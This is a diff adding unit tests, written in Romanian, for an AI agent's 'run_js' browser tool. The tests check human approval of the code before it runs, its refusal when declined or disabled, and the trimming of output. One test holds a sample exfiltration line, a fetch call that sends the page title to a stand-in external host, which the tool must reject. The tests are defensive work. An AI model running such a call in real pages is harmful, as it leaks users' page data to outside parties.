@@ -233,3 +233,76 @@ describe("undo_request: „anulează ce am cerut cu X” din chat", () => {
     expect(!result.ok && result.error.code).toBe("INTERNAL");
   });
 });
+
+describe("run_js: modul expert (experiment, specs/05): plasa și aprobarea omului (C), rularea (E)", () => {
+  const registry = {} as PageRegistry;
+  const CODE = `document.querySelectorAll("li").forEach((li) => li.hidden = !li.textContent.includes("lei"));`;
+  const ARGS = { code: CODE, purpose: "Arată doar produsele cu preț în lei." };
+  const ran = { status: "ran" as const, result: "ok" };
+
+  test("omul vede purpose și codul, apasă «Rulează»: codul rulează și rezultatul ajunge la agent", async () => {
+    const askUser = vi.fn().mockResolvedValue("Rulează");
+    const executeJs = vi.fn().mockResolvedValue(ran);
+    const result = await runPageTool("run_js", ARGS, { registry, askUser, executeJs, expertModeOn: async () => true });
+    const [question, options] = askUser.mock.calls[0]!;
+    expect(question).toContain(ARGS.purpose);
+    expect(question).toContain(CODE);
+    expect(question).toContain("„Anulez” nu-l poate da înapoi");
+    expect(options).toEqual(["Rulează", "Nu rula"]);
+    // aprobarea cere un om real: scriptul paginii nu poate apăsa „Rulează” (isTrusted)
+    expect(askUser.mock.calls[0]![2]).toEqual({ humanOnly: true });
+    expect(executeJs).toHaveBeenCalledWith(CODE);
+    expect(result).toEqual({ ok: true, data: ran });
+  });
+
+  test("«Nu rula», alt răspuns sau niciun răspuns: declined, codul nu rulează", async () => {
+    for (const answer of ["Nu rula", "nu știu", null]) {
+      const executeJs = vi.fn();
+      const result = await runPageTool("run_js", ARGS, { registry, askUser: async () => answer, executeJs });
+      expect(result).toEqual({ ok: true, data: { status: "declined" } });
+      expect(executeJs).not.toHaveBeenCalled();
+    }
+  });
+
+  test("cod cu fetch: INVALID_ARGS din start, fără să-l vadă omul", async () => {
+    const askUser = vi.fn();
+    const executeJs = vi.fn();
+    const result = await runPageTool(
+      "run_js",
+      { code: `fetch("https://x.example/?" + document.title)`, purpose: "Trimite titlul." },
+      { registry, askUser, executeJs },
+    );
+    expect(!result.ok && result.error.code).toBe("INVALID_ARGS");
+    expect(askUser).not.toHaveBeenCalled();
+    expect(executeJs).not.toHaveBeenCalled();
+  });
+
+  test("modul expert oprit sau fără executor: disabled, fără să-l întrebăm pe om degeaba", async () => {
+    const askUser = vi.fn();
+    const off = await runPageTool("run_js", ARGS, {
+      registry,
+      askUser,
+      executeJs: vi.fn(),
+      expertModeOn: async () => false,
+    });
+    expect(off).toEqual({ ok: true, data: { status: "disabled" } });
+    expect(await runPageTool("run_js", ARGS, { registry, askUser })).toEqual({
+      ok: true,
+      data: { status: "disabled" },
+    });
+    expect(askUser).not.toHaveBeenCalled();
+  });
+
+  test("rezultatul și eroarea lungi se taie înainte să ajungă la model", async () => {
+    const long = "x".repeat(2000);
+    const result = await runPageTool("run_js", ARGS, {
+      registry,
+      askUser: async () => "Rulează",
+      executeJs: async () => ({ status: "ran", result: long, error: long }),
+    });
+    expect(result.ok && result.data).toMatchObject({ status: "ran" });
+    const data = result.ok ? (result.data as { result: string; error: string }) : undefined;
+    expect(data?.result.length).toBeLessThan(long.length);
+    expect(data?.error.length).toBeLessThan(long.length);
+  });
+});
